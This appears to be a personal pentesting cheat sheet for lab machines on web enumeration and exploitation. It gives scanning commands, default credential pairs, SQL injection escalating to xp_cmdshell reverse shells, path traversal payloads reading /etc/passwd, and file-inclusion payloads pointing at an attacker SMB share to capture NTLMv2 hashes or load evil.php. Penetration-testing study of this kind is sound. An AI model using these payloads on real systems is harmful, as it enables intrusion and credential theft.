# HTTP and HTTPS

usually the likely attack vector (But can be a rabbit hole as well so dont fall in love with it!)

- Might sound silly but might want to try putting https instead of http if there is nothing going on.

- check the source code, robots.txt. can also run inspect to see whats going on in the background

- If GET doesn't work, why not POST! (see Nickel box on PG)

- if need be, fire up burp suite or Inspect the page

- try to find the CN (which you can use dig for)

- Do basic website scans using both whatweb and nikto

```bash
sudo nikto --host <target>:<port> 

# if basic auth

-id <user>:<password>
```

- Google the CMS, web services for potential easy wins exploit (use searchsploit or exploit-db or google as last resort)
	- Apache 2.4.49 - vuln to dir traversal and RCE

some websites dont work properly if you use the ip address. This may be because the hostname is being referenced in the webpage instead of the IP Address. Consider adding an entry to /etc/hosts if you find anything that looks like a hostname.


```bash
sudo nano /etc/hosts

# add an entry to the last line
<ip> <domain>

```
Manual Enumeration (go to website and click around):

	- Check for usernames, potential domains
	- Check for places where you can upload files
	- check for places where you can provide user input
		- try SQL ' or "
		- if it works, throw xp_cmdshell and try to get a reverse shell (if it is windows)
		- if not, enumerate the table
	- If login pages, try default credentials (try with uppercase as well!)
		- admin:admin
		- admin:password
		- root:root
		- root:toor
		- username:username ( if you find a username)
- Auto Enum:
	- if wordpress, run wpscan. #wpscan
	- if xmlrpc is enabled, use this https://github.com/relarizky/wpxploit
	- Always check out the wp-contents/uploads folder. Might have interesting things inside

```bash
# make sure you get the token from wpscan website!
wpscan --url http://<domain> --enumerate ap --plugins-detection aggressive -o websrv1/wpscan

# if https, add the --disable-tls-checks
# to enum users, add --enumerate u
# if you have a user, add --usernames <username> to brute force, -U <user list>, --passwords <wordlist like rockyou>
```

- Always dirbust and nikto
- The choice of wordlist can be important. What I find useful are:
	- Seclists's big.txt, medium directory (with this you should put in the extension flags as well or you may miss things!)
	- Seclists raft medium directory, files
```bash

nikto -h <ip> -C all

gobuster dir -u http://<target ip> -w <use the seclists dir list> -t 50 --no-error -x config, txt, pdf

# if https. -k to skip SSL errors

gobuster dir -u https://<target ip> -w <seclist> -t 50 -k --no-error

# if page is running things like php or aspx, add -x flag. you an often find things like admin.php

gobuster dir -u http://<target ip> -w <use the seclists dir list> -t 50 --no-error -x php, aspx

# also 

# if any interesting directories, further gobust those

# feroxbuster is pretty cool as well!

feroxbuster -u <target> -x txt,pdf,conf,php,aspx (edit the extensions as needed)

```
- if you find any .git folders, download them!

```bash

# download .git repo

wget -r http://<ip>/.git 

# note the above may not work if you get 403. Instead use git-dumper!

git-dumper http://<ip>/.git <output folder>

git diff

git log

# investigate interesting logs by using

git show 'commit id'
```
- try looking for these sensitive config files:
	- Apache - config.php (may need to path traverse to /etc/apache2), phpmyinfo (reveals interesting information)
		- run dirbuster and see if you can find phpinfo. Identify the root of the directory!
	- wp - wp-config.php
	- if you have path traverse or rce, try looking for rsa keys. You may need to check what kinds of keys are there as it is not always id_rsa; you can do this by checking out the /home/target user/.ssh/authorized_keys file. ecdsa keys have a diff name from id_rsa (id_ecdsa) 
- if you see things like parameters in the url, you should try path traversal

```bash

domain.com/abc/?news=a

# try

?news=../../../../../../etc/passwd

?news=C:/Windows/System32/drivers/etc/hosts

# check for File inclusion esp if it is a Windows MAchine!

start up a impacket smbserver on your attacker

?page=//<attacker ip>/<share>/anything.txt

capture the NTLMv2 hash

# if hash cannot crack

then host a malicious php file and then smbserver again and then

?page=//<attacker ip>/<share>/evil.php

```
once you find some way to upload stuff, see if you can upload php or aspx files from your prepared Tools folders